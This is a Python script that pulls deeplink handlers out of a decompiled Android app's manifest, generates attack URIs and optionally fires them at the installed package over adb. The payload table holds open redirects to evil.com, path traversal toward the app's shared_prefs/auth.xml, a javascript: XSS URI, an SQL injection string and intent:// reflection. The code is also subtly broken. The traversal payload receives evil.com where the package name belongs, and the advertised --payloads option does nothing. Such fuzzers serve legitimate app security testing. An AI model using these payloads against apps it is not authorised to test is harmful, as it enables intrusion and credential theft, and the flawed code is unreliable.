#!/usr/bin/env python3
"""
deeplink_fuzzer.py — Enumerate and test deeplink handlers from a decompiled APK.
Usage: python3 deeplink_fuzzer.py <decompiled_apk_dir> [--package com.example.app] [--payloads payloads.txt]
"""

import os
import re
import sys
import subprocess
import xml.etree.ElementTree as ET
from urllib.parse import urlencode, quote

MANIFEST_PATH = "AndroidManifest.xml"

def find_manifest(base_dir):
    for root, _, files in os.walk(base_dir):
        if MANIFEST_PATH in files:
            return os.path.join(root, MANIFEST_PATH)
    # Try direct path
    direct = os.path.join(base_dir, MANIFEST_PATH)
    return direct if os.path.exists(direct) else None

def parse_deeplinks(manifest_path):
    """Extract all deeplink configurations from manifest."""
    try:
        tree = ET.parse(manifest_path)
        root = tree.getroot()
    except Exception:
        with open(manifest_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        return parse_deeplinks_text(content)

    deeplinks = []
    ns = {'android': 'http://schemas.android.com/apk/res/android'}

    for activity in root.iter('activity'):
        activity_name = activity.get(f'{{{ns["android"]}}}name', 'unknown')
        for intent_filter in activity.iter('intent-filter'):
            has_view = any(
                action.get(f'{{{ns["android"]}}}name') == 'android.intent.action.VIEW'
                for action in intent_filter.iter('action')
            )
            if not has_view:
                continue

            schemes = []
            hosts = []
            paths = []
            for data in intent_filter.iter('data'):
                scheme = data.get(f'{{{ns["android"]}}}scheme')
                host = data.get(f'{{{ns["android"]}}}host')
                path = data.get(f'{{{ns["android"]}}}path')
                path_prefix = data.get(f'{{{ns["android"]}}}pathPrefix')
                path_pattern = data.get(f'{{{ns["android"]}}}pathPattern')

                if scheme: schemes.append(scheme)
                if host: hosts.append(host)
                if path: paths.append(path)
                if path_prefix: paths.append(path_prefix + "*")
                if path_pattern: paths.append(path_pattern)

            if schemes:
                deeplinks.append({
                    'activity': activity_name,
                    'schemes': schemes,
                    'hosts': hosts if hosts else ['*'],
                    'paths': paths if paths else ['/']
                })
    return deeplinks

def parse_deeplinks_text(content):
    """Fallback: regex-based extraction from raw XML text."""
    deeplinks = []
    pattern = r'<data[^>]*android:scheme="([^"]*)"[^>]*(?:android:host="([^"]*)")?[^>]*(?:android:path(?:Prefix|Pattern)?="([^"]*)")?[^>]*/?>'
    return [{'activity': 'extracted', 'schemes': [m[0]], 'hosts': [m[1] or '*'], 'paths': [m[2] or '/']}
            for m in re.findall(pattern, content)]

PAYLOADS = {
    "open_redirect":   "?redirect={}&url={}&return_url={}&next={}",
    "path_traversal":  "../../../../data/data/{}/shared_prefs/auth.xml",
    "xss":             "javascript:alert(1)",
    "null_byte":       "%00.html",
    "sqli":            "' OR '1'='1",
    "url_injection":   "http://evil.com",
    "deep_link_reflection": "../../",
    "intent_reflection": "intent://evil.com/#Intent;scheme=http;end",
}

def generate_payloads(package, deeplink):
    """Generate test payloads for a deeplink."""
    payloads = []
    for scheme in deeplink['schemes']:
        for host in deeplink['hosts']:
            for path in deeplink['paths']:
                # Clean path
                clean_path = path.rstrip('*') if path != '/' else '/'

                # Base URI
                base = f"{scheme}://{host}{clean_path}"

                # Parameterized payloads
                for name, template in PAYLOADS.items():
                    payload = template.format("http://evil.com", "http://evil.com", "http://evil.com", "http://evil.com", package)
                    payloads.append({
                        'uri': f"{base}{payload}",
                        'type': name,
                        'activity': deeplink['activity']
                    })

                # Simple param injection
                for param in ['token', 'user_id', 'return_url', 'redirect', 'callback', 'next']:
                    payloads.append({
                        'uri': f"{base}?{param}=test123",
                        'type': 'param_injection',
                        'activity': deeplink['activity']
                    })

    return payloads

def test_deeplink(uri, package):
    """Test a deeplink via ADB."""
    cmd = ['adb', 'shell', 'am', 'start', '-W', '-a',
           'android.intent.action.VIEW', '-d', uri, package]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        return result.returncode == 0, result.stdout
    except Exception as e:
        return False, str(e)

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <decompiled_apk_dir> [--package com.example.app] [--test]")
        print(f"       {sys.argv[0]} <decompiled_apk_dir> --payloads payloads.txt")
        sys.exit(1)

    base_dir = sys.argv[1]
    package = None
    test_mode = False

    args = sys.argv[2:]
    i = 0
    while i < len(args):
        if args[i] == '--package' and i+1 < len(args):
            package = args[i+1]
            i += 2
        elif args[i] == '--test':
            test_mode = True
            i += 1
        else:
            i += 1

    manifest = find_manifest(base_dir)
    if not manifest:
        print("[!] AndroidManifest.xml not found in decompiled directory")
        sys.exit(1)

    print(f"[*] Found manifest: {manifest}")
    deeplinks = parse_deeplinks(manifest)
    print(f"[*] Found {len(deeplinks)} deeplink handlers\n")

    all_payloads = []
    for dl in deeplinks:
        print(f"  Activity: {dl['activity']}")
        print(f"  Schemes:  {', '.join(dl['schemes'])}")
        print(f"  Hosts:    {', '.join(dl['hosts'])}")
        print(f"  Paths:    {', '.join(dl['paths'])}")
        print()

        if package:
            pl = generate_payloads(package, dl)
            all_payloads.extend(pl)
            print(f"  Generated {len(pl)} test payloads\n")

    if all_payloads and test_mode and package:
        print(f"{'='*60}")
        print(f"Testing {len(all_payloads)} payloads against {package}...")
        print(f"{'='*60}\n")

        for i, pl in enumerate(all_payloads):
            success, output = test_deeplink(pl['uri'], package)
            status = "OK" if success else "FAIL"
            print(f"[{i+1}/{len(all_payloads)}] [{status}] [{pl['type']}] {pl['uri'][:80]}...")

    elif all_payloads:
        # Print payloads
        for pl in all_payloads:
            print(f"[{pl['type']}] {pl['uri']}")

    print(f"\n[✓] Total deeplink handlers: {len(deeplinks)}")
    if all_payloads:
        print(f"[✓] Total test payloads: {len(all_payloads)}")

if __name__ == '__main__':
    main()
